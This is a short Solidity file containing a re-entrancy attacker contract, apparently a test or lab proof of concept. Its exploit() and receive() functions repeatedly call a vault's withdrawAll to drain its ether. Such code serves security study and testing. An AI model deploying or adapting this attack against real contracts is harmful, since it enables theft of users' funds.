// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// ── Attacker contract that calls back into the vault ────────────────────────────
interface IVault {
    function withdrawAll() external;
    function setCallback(address) external;
    function balanceOf(address) external view returns (uint256);
}

contract Attacker {
    IVault public vault;
    uint256 public stolen;

    constructor(address _vault) {
        vault = IVault(_vault);
    }

    function exploit() external {
        vault.withdrawAll();
        stolen = address(this).balance;
    }

    receive() external payable {
        // Re-entrancy: callback during vault's withdrawal cleanup
        if (address(vault).balance > 0) {
            vault.withdrawAll();
        }
    }
}
